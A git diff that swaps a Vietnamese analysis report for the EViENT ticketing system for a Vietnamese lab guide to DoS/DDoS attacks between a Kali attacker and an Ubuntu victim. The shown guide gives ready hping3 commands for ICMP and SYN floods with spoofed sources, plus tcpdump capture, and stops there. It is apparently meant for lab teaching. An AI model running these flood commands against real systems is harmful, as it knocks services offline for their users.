@@ -1,1417 +1,728 @@
-# 📋 BÁO CÁO PHÂN TÍCH HỆ THỐNG - EViENT
-## Ticket Management and Check-in System
+# HƯỚNG DẪN LỆNH TỪNG BƯỚC — DoS/DDoS + Honeypot + Detection
 
-> **Mục tiêu:** Phân tích toàn diện hệ thống EViENT hiện tại để chuẩn bị cho việc rebuild với kiến trúc tối ưu, bảo mật cao và khả năng mở rộng.
+## MÔ HÌNH MẠNG LAB
+
+| Vai trò | Hệ điều hành | IP (ví dụ) |
+|---------|-------------|------------|
+| Attacker | Kali Linux | 192.168.247.130 |
+| Victim | Ubuntu | 192.168.247.129 |
+
+> Thay IP cho khớp với mạng thực tế. Tất cả lệnh chỉ chạy trong lab nội bộ.
 
 ---
 
-## 1. 🎯 TỔNG QUAN HỆ THỐNG
+## BƯỚC 0: SETUP BAN ĐẦU
 
-### 1.1 Mục tiêu kinh doanh
-| Mục tiêu | Mô tả |
-|----------|-------|
-| **Quản lý sự kiện** | Cho phép tổ chức tạo và quản lý các sự kiện (festivals, pop-up events) |
-| **Phát hành vé** | Hệ thống phát hành vé điện tử với QR code |
-| **Check-in nhanh** | Rút ngắn thời gian xếp hàng tại cửa bằng QR scanning |
-| **VIP Experience** | Hỗ trợ đặt chỗ VIP cho khách hạng sang |
+### Trên Ubuntu (Victim)
 
-### 1.2 Giá trị cốt lõi
-```mermaid
-mindmap
-  root((EViENT))
-    Tổ chức sự kiện
-      Tạo/quản lý event
-      Theo dõi bán vé
-      Real-time statistics
-    Khách tham dự
-      Nhận vé QR
-      VIP seat selection
-      Nhanh chóng check-in
-    Nhân viên
-      QR Scanner
-      Verify attendees
-      Track check-ins
+```bash
+# Cập nhật hệ thống
+sudo apt update && sudo apt upgrade -y
+
+# Cài Apache2 web server
+sudo apt install apache2 -y
+sudo systemctl start apache2
+sudo systemctl enable apache2
+
+# Tạo trang web test
+echo "<html><body><h1>Victim Web Server</h1></body></html>" | sudo tee /var/www/html/index.html
+
+# Cài công cụ giám sát mạng
+sudo apt install tcpdump -y
+sudo apt install wireshark -y
+sudo apt install net-tools -y
+
+# Cài Ruby (cần cho PentBox)
+sudo apt install ruby -y
+
+# Xem IP
+ifconfig
 ```
 
-### 1.3 Stakeholders
-| Vai trò | Mô tả | Quyền hạn |
-|---------|-------|-----------|
-| **System Admin** | Quản trị viên hệ thống | Toàn quyền hệ thống |
-| **Organization Admin** | Chủ tổ chức sự kiện | Quản lý tổ chức, sự kiện, nhân viên |
-| **Staff** | Nhân viên check-in | Sử dụng QR scanner, verify vé |
-| **VIP Guest** | Khách VIP | Chọn ghế VIP, check-in |
-| **Regular Guest** | Khách thường | Nhận vé, check-in |
+### Trên Kali (Attacker)
 
----
+```bash
+# Cập nhật hệ thống
+sudo apt update && sudo apt upgrade -y
 
-## 2. 👥 PHÂN TÍCH NGƯỜI DÙNG (User Analysis)
+# Cài công cụ tấn công
+sudo apt install hping3 -y
+sudo apt install nmap -y
+sudo apt install apache2-utils -y
+sudo apt install slowhttptest -y
+sudo apt install net-tools -y
+sudo apt install curl -y
+sudo apt install python3-pip -y
 
-### 2.1 Các nhóm người dùng
-
-#### 🔷 Organization Admin
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Hành vi chính** | Tạo sự kiện, quản lý vé, thêm khách mời, xem thống kê |
-| **Tần suất** | Hàng ngày trong thời gian chuẩn bị sự kiện |
-| **Thiết bị** | Desktop/Laptop (quản lý), Mobile (kiểm tra) |
-| **Pain points** | Giao diện phức tạp, thiếu bulk actions, không có mobile app |
-
-#### 🔷 Staff (Nhân viên check-in)
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Hành vi chính** | Quét QR, verify vé, xử lý các trường hợp đặc biệt |
-| **Tần suất** | Trong suốt sự kiện (cao điểm) |
-| **Thiết bị** | Mobile/Tablet |
-| **Pain points** | Camera chậm, không offline mode, thiếu thông tin khách |
-
-#### 🔷 VIP Guest
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Hành vi chính** | Đăng nhập OTP, chọn ghế VIP, xem vé |
-| **Tần suất** | 1-2 lần trước sự kiện |
-| **Thiết bị** | Mobile > Desktop |
-| **Pain points** | Quy trình đăng nhập phức tạp, không có reminder |
-
-### 2.2 User Journey Maps
-
-```mermaid
-journey
-    title Organization Admin Journey
-    section Tạo sự kiện
-      Đăng nhập: 3: Admin
-      Tạo event mới: 4: Admin
-      Thêm thông tin: 3: Admin
-      Upload banner: 2: Admin
-    section Quản lý vé
-      Import guest list: 2: Admin
-      Gửi email vé: 3: Admin
-      Theo dõi status: 4: Admin
-    section Check-in day
-      Xem realtime stats: 4: Admin
-      Handle issues: 2: Admin
+# Xem IP
+ifconfig
 ```
 
 ---
 
-## 3. 📊 PHÂN TÍCH CHỨC NĂNG HIỆN TẠI (AS-IS)
+## BƯỚC 1: XÁC ĐỊNH IP & KIỂM TRA KẾT NỐI
 
-### 3.1 Danh sách chức năng
+### Kali (Attacker)
 
-| Module | Chức năng | File liên quan | Trạng thái |
-|--------|-----------|----------------|------------|
-| **Authentication** | Login (email/password) | `cookies.mjs` | ✅ Hoạt động |
-| | Login (Google OAuth) | `cookies.mjs` | ✅ Hoạt động |
-| | Đăng ký | `users.mjs` | ✅ Hoạt động |
-| | Đăng xuất | `cookies.mjs` | ✅ Hoạt động |
-| | Cập nhật profile | `users.mjs` | ✅ Hoạt động |
-| **Organization** | Tạo tổ chức (auto khi tạo admin) | `db_user.mjs` | ✅ Tự động |
-| | Cập nhật thông tin org | `org.mjs` | ✅ Hoạt động |
-| | Thêm/xóa nhân viên | `org.mjs` | ✅ Hoạt động |
-| **Event** | Tạo sự kiện | `event.mjs` | ✅ Hoạt động |
-| | Chỉnh sửa sự kiện | `event.mjs` | ✅ Hoạt động |
-| | Xóa sự kiện | `event.mjs` | ✅ Hoạt động |
-| | Danh sách sự kiện | `event.mjs` | ✅ Hoạt động |
-| **Tickets** | Thêm khách mời | `event.mjs` | ✅ Hoạt động |
-| | Tạo QR code | `local_qr.mjs` | ✅ Hoạt động |
-| | Gửi email vé | `sendEmail.mjs` | ✅ Hoạt động |
-| | Import bulk (Excel) | `event.mjs` | ✅ Hoạt động |
-| **VIP Seats** | Đăng nhập OTP | `event.mjs` | ⚠️ Cơ bản |
-| | Chọn ghế VIP | `event.mjs` | ✅ Hoạt động |
-| | Lock seat | `event.mjs` | ✅ Hoạt động |
-| **Check-in** | Quét QR | `Scanner.jsx` | ✅ Hoạt động |
-| | Verify vé | `event.mjs` | ✅ Hoạt động |
-| | Lịch sử scan | `db_event.mjs` | ✅ Hoạt động |
-| **Quiz** | Quiz real-time | `quiz.mjs` | 🔧 Phát triển |
-
-### 3.2 Flow nghiệp vụ hiện tại
-
-```mermaid
-flowchart TD
-    A[Admin đăng ký] --> B[Tạo Organization]
-    B --> C[Tạo Event]
-    C --> D[Thêm Guest thủ công/Excel]
-    D --> E[Hệ thống tạo QR]
-    E --> F[Gửi email vé]
-    F --> G{Loại khách?}
-    G -->|VIP| H[Guest chọn ghế VIP]
-    G -->|Regular| I[Guest nhận vé]
-    H --> J[Ngày sự kiện]
-    I --> J
-    J --> K[Staff quét QR]
-    K --> L[Hệ thống verify]
-    L --> M[Check-in thành công]
+```bash
+ifconfig
+ping -c 4 192.168.247.129
+curl -v http://192.168.247.129/
 ```
 
-### 3.3 Các điểm bất hợp lý / thiếu sót
-
-#### ⚠️ Vấn đề bảo mật NGHIÊM TRỌNG
-
-| ID | Vấn đề | Mức độ | File |
-|----|--------|--------|------|
-| SEC-01 | **Hardcoded credentials trong .env** | 🔴 Critical | `.env` |
-| SEC-02 | **Session secret yếu** ("30082003") | 🔴 Critical | `.env` |
-| SEC-03 | **JWT secret yếu** ("30082003") | 🔴 Critical | `.env` |
-| SEC-04 | **Email password trong code** | 🔴 Critical | `.env` |
-| SEC-05 | **Firebase API key exposed** | 🟠 High | `.env` |
-| SEC-06 | **.env không có trong .gitignore (root)** | 🔴 Critical | `.gitignore` |
-| SEC-07 | **Không có rate limiting** | 🟠 High | `index.mjs` |
-| SEC-08 | **Thiếu CSRF protection** | 🟠 High | `index.mjs` |
-| SEC-09 | **Hardcoded CORS origin** | 🟡 Medium | `index.mjs` |
-
-#### 🔧 Vấn đề kiến trúc
-
-| ID | Vấn đề | Impact |
-|----|--------|--------|
-| ARCH-01 | 3 MongoDB connections riêng biệt (không cần thiết) | Performance, complexity |
-| ARCH-02 | Thiếu middleware authentication thống nhất | Security, maintainability |
-| ARCH-03 | Business logic nằm trong route files | Maintainability |
-| ARCH-04 | Không có API versioning | Scalability |
-| ARCH-05 | Thiếu centralized error handling | Reliability |
-| ARCH-06 | Commented code nhiều | Code quality |
-
-#### 📦 Vấn đề kỹ thuật
-
-| ID | Vấn đề | Impact |
-|----|--------|--------|
-| TECH-01 | Typo: `scr` thay vì `src` trong npm start | Build error |
-| TECH-02 | SSL certificates trong repo | Security |
-| TECH-03 | Không có Docker setup chuẩn | Deployment |
-| TECH-04 | Thiếu testing | Quality |
-| TECH-05 | Không có logging chuẩn | Monitoring |
-
-### 3.4 Đánh giá giữ/cải tiến/loại bỏ
-
-| Thành phần | Quyết định | Lý do |
-|------------|------------|-------|
-| **Core business logic** | ✅ Giữ | Đã hoạt động, cần tái cấu trúc |
-| **MongoDB schema** | 🔄 Cải tiến | Cần thêm indexes, validation |
-| **Authentication flow** | 🔄 Cải tiến | Cần thêm bảo mật, 2FA |
-| **QR generation** | ✅ Giữ | Hoạt động tốt |
-| **Email template** | 🔄 Cải tiến | Cần responsive design |
-| **Quiz module** | ❌ Loại bỏ/Tách | Không liên quan core business |
-| **Teacher/Client pages** | ❌ Loại bỏ | Không rõ mục đích |
-| **password2 field** | ❌ Loại bỏ | Anti-pattern |
-| **3 DB connections** | 🔄 Hợp nhất | Không cần thiết phân tách |
-
----
-
-## 4. 🚀 ĐỀ XUẤT HỆ THỐNG MỚI (TO-BE)
-
-### 4.1 Danh sách chức năng hệ thống mới
-
-```mermaid
-graph TB
-    subgraph "🔐 Authentication & Authorization"
-        A1[Email/Password Login]
-        A2[Google OAuth 2.0]
-        A3[Magic Link Login]
-        A4[2FA - TOTP]
-        A5[Role-based Access Control]
-        A6[Session Management]
-    end
-    
-    subgraph "🏢 Organization Management"
-        O1[CRUD Organization]
-        O2[Team Members Management]
-        O3[Role Assignment]
-        O4[Subscription/Billing]
-    end
-    
-    subgraph "📅 Event Management"
-        E1[CRUD Events]
-        E2[Multi-ticket Types]
-        E3[Event Templates]
-        E4[Recurring Events]
-        E5[Event Analytics Dashboard]
-    end
-    
-    subgraph "🎫 Ticket Management"
-        T1[Generate QR Tickets]
-        T2[Bulk Import Excel/CSV]
-        T3[Email Delivery]
-        T4[SMS Notifications]
-        T5[Ticket Transfer]
-        T6[Refund Management]
-    end
-    
-    subgraph "💺 VIP Management"
-        V1[Seat Map Editor]
-        V2[OTP Verification]
-        V3[Real-time Seat Lock]
-        V4[Seat Assignment Rules]
-    end
-    
-    subgraph "📱 Check-in System"
-        C1[QR Scanner - Camera]
-        C2[Manual Code Entry]
-        C3[Offline Mode]
-        C4[Real-time Sync]
-        C5[Staff Assignment]
-    end
-    
-    subgraph "📊 Analytics & Reports"
-        R1[Real-time Dashboard]
-        R2[Attendance Reports]
-        R3[Revenue Analytics]
-        R4[Export Data]
-    end
-```
-
-### 4.2 Luồng nghiệp vụ tối ưu
-
-```mermaid
-sequenceDiagram
-    participant Admin
-    participant System
-    participant Email
-    participant VIPGuest
-    participant Staff
-    participant Socket
-    
-    Note over Admin,Socket: Phase 1: Event Setup
-    Admin->>System: Tạo Event + Ticket Types
-    System->>System: Validate & Save
-    Admin->>System: Import Guest List (Excel)
-    System->>System: Generate QR Codes (batch)
-    System->>Email: Queue emails
-    Email-->>VIPGuest: Gửi vé + OTP link
-    
-    Note over Admin,Socket: Phase 2: VIP Seat Selection
-    VIPGuest->>System: Truy cập link OTP
-    System->>VIPGuest: Yêu cầu verify (email/phone)
-    VIPGuest->>System: Submit OTP
-    System->>System: Verify OTP
-    System->>VIPGuest: Hiển thị seat map
-    VIPGuest->>System: Chọn ghế
-    System->>Socket: Broadcast seat lock
-    System->>VIPGuest: Xác nhận
-    
-    Note over Admin,Socket: Phase 3: Check-in Day
-    Staff->>System: Open Scanner
-    Staff->>System: Scan QR
-    System->>System: Verify ticket
-    System->>Socket: Broadcast check-in
-    Socket-->>Admin: Real-time update
-    System->>Staff: Show guest info
-```
-
-### 4.3 Ưu tiên tính năng (MoSCoW)
-
-| Priority | Feature | Justification |
-|----------|---------|---------------|
-| **MUST** | Email/Password + OAuth login | Core functionality |
-| **MUST** | CRUD Events | Core functionality |
-| **MUST** | Generate QR tickets | Core functionality |
-| **MUST** | QR Scanner | Core functionality |
-| **MUST** | Email delivery | Core functionality |
-| **MUST** | Basic dashboard | User needs |
-| **SHOULD** | VIP seat selection | Differentiator |
-| **SHOULD** | Bulk import | Efficiency |
-| **SHOULD** | Real-time stats | User experience |
-| **SHOULD** | 2FA | Security |
-| **SHOULD** | Offline scanner mode | Reliability |
-| **COULD** | SMS notifications | Enhancement |
-| **COULD** | Ticket transfer | Enhancement |
-| **COULD** | Event templates | Efficiency |
-| **COULD** | Mobile app | User experience |
-| **WON'T** | Payment processing (v1) | Complexity |
-| **WON'T** | Quiz module | Out of scope |
-
----
-
-## 5. 📝 USE CASE CHI TIẾT
-
-### UC-01: Đăng nhập hệ thống
-
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Actor** | Organization Admin, Staff |
-| **Mô tả** | Người dùng đăng nhập để truy cập hệ thống |
-| **Pre-condition** | Đã có tài khoản |
-| **Post-condition** | Đăng nhập thành công, session được tạo |
-
-**Main Flow:**
-1. User truy cập trang login
-2. User chọn phương thức (Email/Google)
-3. User nhập credentials
-4. System validate
-5. System tạo session + JWT
-6. Redirect to dashboard
-
-**Alternative Flow:**
-- 3a. User chọn Google → Redirect OAuth flow
-- 5a. 2FA enabled → Yêu cầu TOTP code
-
-**Exception:**
-- E1: Credentials sai → Hiển thị error, retry limit
-- E2: Account locked → Hiển thị message, contact support
-- E3: 2FA fail → Lock after 3 attempts
-
----
-
-### UC-02: Tạo sự kiện mới
-
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Actor** | Organization Admin |
-| **Mô tả** | Admin tạo sự kiện mới cho tổ chức |
-| **Pre-condition** | Đã đăng nhập, có quyền admin |
-| **Post-condition** | Sự kiện được tạo, sẵn sàng thêm khách |
-
-**Main Flow:**
-1. Admin click "Create Event"
-2. System hiển thị form
-3. Admin nhập: Tên, Địa điểm, Thời gian, Banner
-4. Admin định nghĩa ticket types
-5. Admin submit
-6. System validate & save
-7. Redirect to event detail
-
-**Alternative Flow:**
-- 4a. Clone từ template → Load thông tin sẵn
-- 6a. Validation fail → Highlight lỗi
-
----
-
-### UC-03: Thêm khách mời (Bulk Import)
-
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Actor** | Organization Admin |
-| **Mô tả** | Import danh sách khách từ file Excel |
-| **Pre-condition** | Sự kiện đã tồn tại |
-| **Post-condition** | Khách được thêm, vé được tạo |
-
-**Main Flow:**
-1. Admin truy cập event
-2. Admin click "Import Guests"
-3. Admin upload Excel file
-4. System parse & preview
-5. Admin confirm
-6. System generate QR codes (background job)
-7. System send emails (queue)
-8. Hiển thị progress
-
-**Exception:**
-- E1: File format sai → Show error template
-- E2: Duplicate emails → Highlight, cho phép skip/update
-- E3: Email gửi fail → Retry queue, notify admin
-
----
-
-### UC-04: Check-in bằng QR
-
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Actor** | Staff |
-| **Mô tả** | Quét QR để check-in khách |
-| **Pre-condition** | Staff đã đăng nhập, có quyền scanner |
-| **Post-condition** | Vé được đánh dấu đã check-in |
-
-**Main Flow:**
-1. Staff mở Scanner
-2. Staff quét QR code
-3. System decode & verify
-4. System hiển thị thông tin khách
-5. Staff confirm check-in
-6. System cập nhật status
-7. Real-time sync to dashboard
-
-**Alternative Flow:**
-- 2a. Camera không hoạt động → Manual code entry
-- 3a. Offline mode → Local verify, sync later
-
-**Exception:**
-- E1: QR invalid → Show error, manual lookup
-- E2: Already checked-in → Show warning, previous check-in info
-- E3: Wrong event → Show event mismatch error
-
----
-
-### UC-05: Chọn ghế VIP
-
-| Thuộc tính | Chi tiết |
-|------------|----------|
-| **Actor** | VIP Guest |
-| **Mô tả** | Khách VIP chọn ghế yêu thích |
-| **Pre-condition** | Đã được mời, có OTP link |
-| **Post-condition** | Ghế được lock cho khách |
-
-**Main Flow:**
-1. Guest click OTP link trong email
-2. System yêu cầu verify (email/phone)
-3. Guest nhập OTP
-4. System verify
-5. System hiển thị seat map
-6. Guest chọn ghế (số lượng = số vé)
-7. System lock seats real-time
-8. Guest confirm
-9. System cập nhật vé với seat info
-
-**Exception:**
-- E1: OTP hết hạn → Gửi lại OTP
-- E2: Seat đã bị lock → Refresh, chọn ghế khác
-- E3: Session timeout → Start over
-
----
-
-## 6. ⚙️ NON-FUNCTIONAL REQUIREMENTS
-
-### 6.1 Hiệu năng
-
-| Metric | Requirement | Measurement |
-|--------|-------------|-------------|
-| **Page Load Time** | < 2s | 95th percentile |
-| **API Response Time** | < 500ms | 95th percentile |
-| **QR Scan** | < 1s | From scan to result |
-| **Concurrent Users** | 500+ | Per event |
-| **Ticket Generation** | 1000/min | Background job |
-| **Email Delivery** | 1000/5min | Queue rate |
-
-### 6.2 Bảo mật
-
-| Requirement | Implementation |
-|-------------|----------------|
-| **Password Storage** | bcrypt (cost factor 12) |
-| **Session** | HttpOnly, Secure, SameSite cookies |
-| **Data in Transit** | TLS 1.3 |
-| **Data at Rest** | Encrypted (AES-256) |
-| **Rate Limiting** | 100 req/min per IP |
-| **CSRF Protection** | Token-based |
-| **XSS Prevention** | Content-Security-Policy |
-| **SQL Injection** | Parameterized queries |
-| **Secret Management** | Environment variables + vault |
-| **Audit Logging** | All sensitive operations |
-
-### 6.3 Khả năng mở rộng
-
-```mermaid
-graph LR
-    subgraph "Load Balancer"
-        LB[Nginx/HAProxy]
-    end
-    
-    subgraph "Application Tier"
-        A1[API Server 1]
-        A2[API Server 2]
-        A3[API Server N]
-    end
-    
-    subgraph "Data Tier"
-        DB[(MongoDB Replica Set)]
-        Redis[(Redis Cluster)]
-    end
-    
-    subgraph "Background Jobs"
-        Q[Job Queue]
-        W1[Worker 1]
-        W2[Worker N]
-    end
-    
-    LB --> A1
-    LB --> A2
-    LB --> A3
-    A1 --> DB
-    A2 --> DB
-    A3 --> DB
-    A1 --> Redis
-    A2 --> Redis
-    A3 --> Redis
-    A1 --> Q
-    Q --> W1
-    Q --> W2
-```
-
-### 6.4 Logging & Monitoring
-
-| Component | Tool | Purpose |
-|-----------|------|---------|
-| **Application Logs** | Winston/Pino | Structured logging |
-| **Access Logs** | Morgan | HTTP request logs |
-| **Error Tracking** | Sentry | Exception monitoring |
-| **APM** | New Relic / DataDog | Performance monitoring |
-| **Metrics** | Prometheus + Grafana | System metrics |
-| **Alerting** | PagerDuty | Incident response |
-
-### 6.5 Khả năng maintain
-
-| Aspect | Strategy |
-|--------|----------|
-| **Code Style** | ESLint + Prettier |
-| **Code Review** | PR required |
-| **Testing** | Unit + Integration + E2E |
-| **Documentation** | API docs (OpenAPI), Code comments |
-| **Versioning** | Semantic versioning |
-| **CI/CD** | Automated pipeline |
-
----
-
-## 7. 🏗 KIẾN TRÚC ĐỀ XUẤT
-
-### 7.1 Tổng thể kiến trúc
-
-```mermaid
-graph TB
-    subgraph "Client Layer"
-        WEB[React SPA]
-        MOBILE[PWA / React Native]
-    end
-    
-    subgraph "API Gateway"
-        GW[API Gateway / Nginx]
-    end
-    
-    subgraph "Application Layer"
-        AUTH[Auth Service]
-        EVENT[Event Service]
-        TICKET[Ticket Service]
-        NOTIFY[Notification Service]
-    end
-    
-    subgraph "Real-time"
-        WS[WebSocket Server]
-    end
-    
-    subgraph "Background Processing"
-        QUEUE[Bull Queue / Redis]
-        WORKER[Worker Processes]
-    end
-    
-    subgraph "Data Layer"
-        MONGO[(MongoDB)]
-        REDIS[(Redis Cache)]
-        S3[(Object Storage)]
-    end
-    
-    WEB --> GW
-    MOBILE --> GW
-    GW --> AUTH
-    GW --> EVENT
-    GW --> TICKET
-    GW --> WS
-    
-    AUTH --> MONGO
-    EVENT --> MONGO
-    TICKET --> MONGO
-    
-    AUTH --> REDIS
-    EVENT --> REDIS
-    
-    TICKET --> QUEUE
-    QUEUE --> WORKER
-    WORKER --> NOTIFY
-    NOTIFY --> S3
-```
-
-### 7.2 Kiểu kiến trúc: **Modular Monolith** → **Microservices Ready**
-
-**Lý do:**
-1. Dễ phát triển ban đầu
-2. Không over-engineering
-3. Có thể tách thành microservices khi cần
-4. Phù hợp với team size nhỏ-vừa
-
-```
-src/
-├── modules/
-│   ├── auth/
-│   │   ├── controllers/
-│   │   ├── services/
-│   │   ├── repositories/
-│   │   ├── dtos/
-│   │   └── routes.ts
-│   ├── organization/
-│   ├── event/
-│   ├── ticket/
-│   └── notification/
-├── shared/
-│   ├── middleware/
-│   ├── utils/
-│   ├── database/
-│   └── config/
-└── index.ts
-```
-
-### 7.3 API Design Guidelines
-
-| Principle | Rule |
-|-----------|------|
-| **Versioning** | `/api/v1/...` |
-| **Naming** | Plural nouns (`/events`, `/tickets`) |
-| **HTTP Methods** | GET/POST/PUT/PATCH/DELETE |
-| **Status Codes** | Standard HTTP codes |
-| **Error Format** | `{ error: { code, message, details } }` |
-| **Pagination** | `?page=1&limit=20` |
-| **Filtering** | `?status=active&type=vip` |
-| **Sorting** | `?sort=-createdAt` |
-| **Response** | `{ data, meta, pagination }` |
-
-**Example endpoints:**
-```
-GET    /api/v1/events
-POST   /api/v1/events
-GET    /api/v1/events/:id
-PATCH  /api/v1/events/:id
-DELETE /api/v1/events/:id
-GET    /api/v1/events/:id/tickets
-POST   /api/v1/events/:id/tickets/bulk
-POST   /api/v1/tickets/:id/check-in
-```
-
-### 7.4 Authentication & Authorization
-
-```mermaid
-sequenceDiagram
-    participant Client
-    participant Gateway
-    participant Auth
-    participant Service
-    participant DB
-    
-    Client->>Gateway: Request + JWT
-    Gateway->>Gateway: Validate JWT signature
-    Gateway->>Auth: Verify token
-    Auth->>DB: Check session/user
-    Auth-->>Gateway: User + Permissions
-    Gateway->>Service: Request + User Context
-    Service->>Service: Check RBAC
-    Service-->>Client: Response
-```
-
-**RBAC Model:**
-```typescript
-enum Role {
-  SUPER_ADMIN = 'super_admin',
-  ORG_ADMIN = 'org_admin', 
-  ORG_MANAGER = 'org_manager',
-  STAFF = 'staff'
-}
-
-enum Permission {
-  // Events
-  CREATE_EVENT = 'event:create',
-  READ_EVENT = 'event:read',
-  UPDATE_EVENT = 'event:update',
-  DELETE_EVENT = 'event:delete',
-  
-  // Tickets
-  CREATE_TICKET = 'ticket:create',
-  READ_TICKET = 'ticket:read',
-  CHECK_IN = 'ticket:checkin',
-  
-  // Organization
-  MANAGE_USERS = 'org:manage_users',
-}
+### Ubuntu (Victim)
+
+```bash
+ifconfig
+ping -c 4 192.168.247.130
 ```
 
 ---
 
-## 8. 💾 THIẾT KẾ DỮ LIỆU
+## BƯỚC 2: ICMP FLOOD
 
-### 8.1 Entity Relationship Diagram
+### Kali — Tấn công
 
-```mermaid
-erDiagram
-    USER ||--o{ ORGANIZATION : "owns"
-    USER ||--o{ ORG_MEMBER : "member_of"
-    ORGANIZATION ||--o{ ORG_MEMBER : "has"
-    ORGANIZATION ||--o{ EVENT : "hosts"
-    EVENT ||--o{ TICKET_TYPE : "has"
-    EVENT ||--o{ GUEST : "has"
-    GUEST ||--o{ TICKET : "owns"
-    TICKET_TYPE ||--o{ TICKET : "defines"
-    EVENT ||--o{ SEAT_MAP : "has"
-    SEAT_MAP ||--o{ SEAT : "contains"
-    TICKET ||--o| SEAT : "assigned"
-    TICKET ||--o{ CHECK_IN_LOG : "has"
-    USER ||--o{ CHECK_IN_LOG : "scanned_by"
-    USER ||--o{ SESSION : "has"
-    USER ||--o{ AUDIT_LOG : "creates"
-    
-    USER {
-        ObjectId _id PK
-        String email UK
-        String password_hash
-        String display_name
-        String profile_picture
-        Boolean is_verified
-        Boolean is_2fa_enabled
-        String totp_secret
-        DateTime created_at
-        DateTime updated_at
-    }
-    
-    ORGANIZATION {
-        ObjectId _id PK
-        ObjectId owner_id FK
-        String name
-        String slug UK
-        String description
-        String logo_url
-        String banner_url
-        DateTime created_at
-    }
-    
-    ORG_MEMBER {
-        ObjectId _id PK
-        ObjectId org_id FK
-        ObjectId user_id FK
-        String role
-        DateTime joined_at
-    }
-    
-    EVENT {
-        ObjectId _id PK
-        ObjectId org_id FK
-        String name
-        String slug UK
-        String description
-        String location
-        String banner_url
-        DateTime start_time
-        DateTime end_time
-        String status
-        JSON settings
-        DateTime created_at
-    }
-    
-    TICKET_TYPE {
-        ObjectId _id PK
-        ObjectId event_id FK
-        String name
-        Number quantity
-        Number sold
-        Decimal price
-        Boolean is_vip
-    }
-    
-    GUEST {
-        ObjectId _id PK
-        ObjectId event_id FK
-        String full_name
-        String email
-        String phone
-        String verification_code
-        Boolean is_verified
-        DateTime verified_at
-    }
-    
-    TICKET {
-        ObjectId _id PK
-        ObjectId event_id FK
-        ObjectId guest_id FK
-        ObjectId type_id FK
-        ObjectId seat_id FK
-        String ticket_code UK
-        String qr_data
-        String status
-        DateTime checked_in_at
-        DateTime created_at
-    }
-    
-    SEAT_MAP {
-        ObjectId _id PK
-        ObjectId event_id FK
-        String name
-        JSON layout
-    }
-    
-    SEAT {
-        ObjectId _id PK
-        ObjectId seat_map_id FK
-        String row
-        String number
-        String status
-        DateTime locked_at
-        ObjectId locked_by FK
-    }
-    
-    CHECK_IN_LOG {
-        ObjectId _id PK
-        ObjectId ticket_id FK
-        ObjectId scanned_by FK
-        String result
-        DateTime scanned_at
-    }
+```bash
+# ICMP Flood: gửi liên tục gói ICMP echo request
+sudo hping3 --icmp --flood 192.168.247.129
+
+# Có giới hạn (khuyến nghị cho lab):
+sudo hping3 --icmp --flood -c 1000 192.168.247.129
 ```
 
-### 8.2 Indexes Strategy
+### Ubuntu — Quan sát
 
-| Collection | Index | Type | Purpose |
-|------------|-------|------|---------|
-| `users` | `{ email: 1 }` | Unique | Login lookup |
-| `users` | `{ googleId: 1 }` | Sparse | OAuth lookup |
-| `organizations` | `{ slug: 1 }` | Unique | URL lookup |
-| `organizations` | `{ owner_id: 1 }` | Regular | Owner query |
-| `events` | `{ org_id: 1, status: 1 }` | Compound | List events |
-| `events` | `{ slug: 1 }` | Unique | URL lookup |
-| `events` | `{ start_time: 1 }` | Regular | Date filtering |
-| `tickets` | `{ ticket_code: 1 }` | Unique | QR lookup |
-| `tickets` | `{ event_id: 1, status: 1 }` | Compound | Event stats |
-| `tickets` | `{ guest_id: 1 }` | Regular | Guest tickets |
-| `guests` | `{ event_id: 1, email: 1 }` | Compound, Unique | Duplicate check |
-| `check_in_logs` | `{ ticket_id: 1, scanned_at: -1 }` | Compound | History |
-| `seats` | `{ seat_map_id: 1, status: 1 }` | Compound | Available seats |
+```bash
+# Bắt gói ICMP
+sudo tcpdump -i eth0 icmp -n
 
-### 8.3 Data Migration Strategy
-
-```mermaid
-flowchart LR
-    subgraph "Old System"
-        OA[(evient_auth)]
-        OO[(evient_org)]
-        OE[(evient_event)]
-    end
-    
-    subgraph "Migration"
-        M[Migration Scripts]
-        V[Validation]
-        T[Transform]
-    end
-    
-    subgraph "New System"
-        N[(evient_v2)]
-    end
-    
-    OA --> M
-    OO --> M
-    OE --> M
-    M --> V
-    V --> T
-    T --> N
+# Lưu ra file pcap
+sudo tcpdump -i eth0 icmp -n -w icmp_flood.pcap
 ```
 
 ---
 
-## 9. 🛠 TECH STACK ĐỀ XUẤT
+## BƯỚC 3: SYN FLOOD
 
-### 9.1 Frontend
+### Kali — Tấn công
 
-| Layer | Technology | Reasoning |
-|-------|------------|-----------|
-| **Framework** | Next.js 14 (App Router) | SSR, SEO, Performance |
-| **Language** | TypeScript | Type safety |
-| **Styling** | TailwindCSS + shadcn/ui | Modern, consistent |
-| **State** | Zustand / TanStack Query | Simple, efficient |
-| **Forms** | React Hook Form + Zod | Validation |
-| **Real-time** | Socket.io-client | WebSocket |
-| **Charts** | Recharts | Visualization |
-| **Testing** | Vitest + Playwright | E2E |
+```bash
+# SYN Flood vào port 80
+sudo hping3 -S --flood -p 80 --rand-source 192.168.247.129
 
-### 9.2 Backend
-
-| Layer | Technology | Reasoning |
-|-------|------------|-----------|
-| **Runtime** | Node.js 20 LTS | Stable, long-term |
-| **Framework** | Fastify / Express | Performance, ecosystem |
-| **Language** | TypeScript | Type safety |
-| **Validation** | Zod | Schema validation |
-| **ORM** | Mongoose | MongoDB integration |
-| **Queue** | BullMQ | Background jobs |
-| **Email** | Nodemailer + React Email | Templates |
-| **Testing** | Vitest + Supertest | Unit + Integration |
-
-### 9.3 Database & Cache
-
-| Component | Technology | Reasoning |
-|-----------|------------|-----------|
-| **Primary DB** | MongoDB Atlas | Flexible schema, scaling |
-| **Cache** | Redis | Sessions, rate limiting |
-| **Search** | MongoDB Atlas Search | Full-text search |
-| **Object Storage** | S3 / Cloudflare R2 | QR images, uploads |
-
-### 9.4 Infrastructure & DevOps
-
-| Component | Technology | Reasoning |
-|-----------|------------|-----------|
-| **Containerization** | Docker | Consistency |
-| **Orchestration** | Docker Compose / k8s | Deployment |
-| **CI/CD** | GitHub Actions | Automation |
-| **Hosting** | Vercel (FE) + Railway/Fly.io (BE) | Easy deployment |
-| **CDN** | Cloudflare | Performance |
-| **Monitoring** | Sentry + LogTail | Observability |
-| **Secrets** | Doppler / 1Password | Secret management |
-
